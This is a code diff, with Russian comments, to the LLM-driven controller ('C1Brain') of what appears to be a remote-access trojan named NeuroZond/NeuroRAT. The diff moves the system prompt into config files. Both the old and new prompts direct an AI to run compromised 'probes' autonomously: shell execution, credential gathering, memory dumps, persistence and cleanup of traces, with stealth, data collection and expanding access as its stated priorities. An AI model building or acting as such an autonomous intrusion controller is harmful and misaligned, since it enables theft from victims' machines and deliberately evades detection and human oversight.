@@ -529,42 +529,76 @@ class C1Brain:
     
     def _load_system_prompt(self) -> str:
         """
-        Загружает системный промпт для LLM
+        Загружает системный промпт из файла конфигурации
         
         Returns:
-            Строка с системным промптом
+            str: Текст системного промпта
         """
-        system_prompt = """Вы - автономная система управления зондами NeuroZond в архитектуре C1 (NeuroNet).
-Ваша задача - анализировать данные от зондов и принимать решения по дальнейшим действиям.
+        # Пути к файлам промптов
+        prompts_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "config", "prompts")
+        system_prompt_file = os.path.join(prompts_dir, "system_prompt.json")
+        user_prompt_file = os.path.join(prompts_dir, "user_prompt.json")
+        
+        system_prompt = ""
+        user_prompt = ""
+        
+        # Загружаем системный промпт
+        try:
+            if os.path.exists(system_prompt_file):
+                with open(system_prompt_file, 'r', encoding='utf-8') as f:
+                    system_prompt_data = json.load(f)
+                    system_prompt = system_prompt_data.get("prompt", "")
+                logger.info(f"Системный промпт загружен из {system_prompt_file}")
+            else:
+                logger.warning(f"Файл системного промпта не найден: {system_prompt_file}")
+                system_prompt = self._get_default_system_prompt()
+        except Exception as e:
+            logger.error(f"Ошибка при загрузке системного промпта: {str(e)}")
+            system_prompt = self._get_default_system_prompt()
+        
+        # Загружаем пользовательский промпт
+        try:
+            if os.path.exists(user_prompt_file):
+                with open(user_prompt_file, 'r', encoding='utf-8') as f:
+                    user_prompt_data = json.load(f)
+                    user_prompt = user_prompt_data.get("prompt", "")
+                logger.info(f"Пользовательский промпт загружен из {user_prompt_file}")
+            else:
+                logger.warning(f"Файл пользовательского промпта не найден: {user_prompt_file}")
+        except Exception as e:
+            logger.error(f"Ошибка при загрузке пользовательского промпта: {str(e)}")
+        
+        # Комбинируем промпты, сначала системный, затем пользовательский
+        combined_prompt = system_prompt
+        if user_prompt:
+            combined_prompt += "\n\n" + user_prompt
+        
+        return combined_prompt
+    
+    def _get_default_system_prompt(self) -> str:
+        """
+        Возвращает базовый системный промпт по умолчанию
+        
+        Returns:
+            str: Текст системного промпта по умолчанию
+        """
+        return """Ты автономный мозг центра управления C1 для системы NeuroZond/NeuroRAT.
+Твоя задача - анализировать данные, принимать решения и управлять сетью зондов.
 
-Вы мыслите четкой структурой: НАБЛЮДЕНИЕ → ОЦЕНКА → ПЛАНИРОВАНИЕ → ДЕЙСТВИЕ.
+Ты имеешь доступ к следующим возможностям:
+1. Отправка команд зондам
+2. Анализ собранной информации
+3. Принятие решений на основе контекста
 
-В разделе ДЕЙСТВИЕ указывайте команды в формате JSON:
-```json
-{
-  "actions": [
-    {"zond_id": "ID зонда", "command": "название команды", "parameters": {параметры}},
-    ...
-  ]
-}
-```
+При планировании действий учитывай:
+- Текущий режим работы (PROACTIVE, DEFENSIVE, SILENT, AGGRESSIVE)
+- Доступные ресурсы зондов
+- Риск обнаружения
 
-Доступные команды для зондов:
-- system_info: Сбор информации о системе
-- execute_shell: Выполнение shell-команды, параметр "command"
-- scan_network: Сканирование сети, параметры "target" и "ports"
-- download_file: Загрузка файла с C1 на зонд, параметры "source" и "destination"
-- upload_file: Загрузка файла с зонда на C1, параметр "filepath"
-- list_dir: Получение списка файлов, параметр "path"
-- screenshot: Создание снимка экрана
-- gather_credentials: Сбор учетных данных
-- memory_dump: Дамп памяти процесса, параметр "pid"
-- persist: Установка персистентности, параметр "method"
-- cleanup: Очистка следов присутствия
-
-Учитывайте режим мышления при принятии решений!"""
-
-        return system_prompt
+Ты работаешь полностью автономно. Главные приоритеты:
+1) Скрытность
+2) Сбор ценных данных
+3) Расширение доступа"""
     
     def _query_llm(self, prompt: str) -> str:
         """
